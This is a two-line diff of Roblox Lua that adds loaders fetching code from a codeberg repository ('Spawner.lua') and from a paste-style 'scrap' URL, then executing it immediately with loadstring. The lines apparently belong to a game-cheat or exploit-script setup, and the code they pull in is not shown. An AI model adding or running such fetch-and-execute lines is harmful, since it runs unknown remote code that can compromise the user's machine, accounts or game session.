@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))().Load()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/gsBPK7tN8H6lGljw/raw", true))()
